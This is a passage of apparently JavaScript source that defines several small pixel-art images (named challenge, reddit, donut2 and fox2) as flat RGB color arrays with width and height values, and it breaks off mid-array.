255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
challenge.width = 35;
challenge.height = 45;
var reddit = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 201, 195, 197, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 201, 195, 197, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 201, 195, 197, 154, 159, 155, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 154, 159, 155, 201, 195, 197, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 154, 159, 155, 154, 159, 155, 255, 255, 255, 154, 159, 155, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 154, 159, 155, 255, 255, 255, 154, 159, 155, 154, 159, 155, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 154, 159, 155, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 154, 159, 155, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 129, 138, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 129, 138, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 129, 138, 255, 0, 0, 255, 0, 0, 163, 1, 26, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 129, 138, 255, 0, 0, 255, 0, 0, 163, 1, 26, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 163, 1, 26, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 163, 1, 26, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 163, 1, 26, 163, 1, 26, 201, 195, 197, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 201, 195, 197, 163, 1, 26, 163, 1, 26, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 201, 195, 197, 255, 255, 255, 201, 195, 197, 201, 195, 197, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 201, 195, 197, 201, 195, 197, 255, 255, 255, 201, 195, 197, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 201, 195, 197, 201, 195, 197, 201, 195, 197, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 201, 195, 197, 201, 195, 197, 201, 195, 197, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 201, 195, 197, 201, 195, 197, 201, 195, 197, 201, 195, 197, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 201, 195, 197, 201, 195, 197, 201, 195, 197, 201, 195, 197, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 154, 159, 155, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
reddit.width = 26;
reddit.height = 27;
var donut2 = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 233, 177, 106, 233, 177, 106, 233, 177, 106, 233, 177, 106, 233, 177, 106, 233, 177, 106, 233, 177, 106, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 233, 177, 106, 233, 177, 106, 233, 177, 106, 233, 177, 106, 233, 177, 106, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 238, 105, 255, 0, 0, 0, 238, 105, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 238, 105, 255, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 238, 105, 255, 0, 0, 0, 0, 0, 0, 238, 105, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 233, 153, 106, 233, 177, 106, 0, 0, 0, 0, 0, 0, 233, 153, 106, 233, 177, 106, 0, 0, 0, 0, 0, 0, 0, 0, 0, 233, 177, 106, 233, 153, 106, 0, 0, 0, 0, 0, 0, 233, 177, 106, 233, 153, 106, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 233, 153, 106, 233, 177, 106, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
donut2.width = 21;
donut2.height = 16;
var fox2 = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 173, 65, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 173, 65, 0, 0, 0, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 